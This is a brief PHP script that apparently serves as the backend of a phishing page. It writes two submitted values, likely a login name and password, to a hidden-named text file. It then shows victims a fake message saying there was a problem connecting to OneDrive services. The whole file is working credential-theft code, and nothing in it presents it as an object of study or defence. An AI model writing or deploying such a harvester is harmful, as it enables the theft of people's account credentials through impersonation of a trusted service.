<?php

if(isset($_REQUEST['secured'])) {
    $a = $_REQUEST['a'];
    $b = $_REQUEST['b'];
    file_put_contents("AvW89@08$^&DGHV.txt", $a . " " . $b . "\n", FILE_APPEND);
    echo "There was a problem connecting to OneDrive services. Contact your system administrator or try again later.";
}